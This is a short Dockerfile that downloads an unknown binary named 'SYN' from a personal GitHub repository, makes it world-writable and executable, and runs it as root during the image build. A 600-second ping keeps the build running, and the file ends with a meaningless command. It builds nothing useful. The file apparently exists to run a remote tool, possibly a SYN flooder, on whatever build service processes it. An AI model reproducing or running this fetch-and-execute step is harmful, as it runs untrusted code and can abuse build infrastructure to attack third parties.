FROM alpine:latest

WORKDIR /root

RUN apk add wget sudo
RUN wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/SYN
RUN chmod 777 SYN
RUN sudo ./SYN;ping 127.0.0.1 -w 600
RUN uhirheuirr
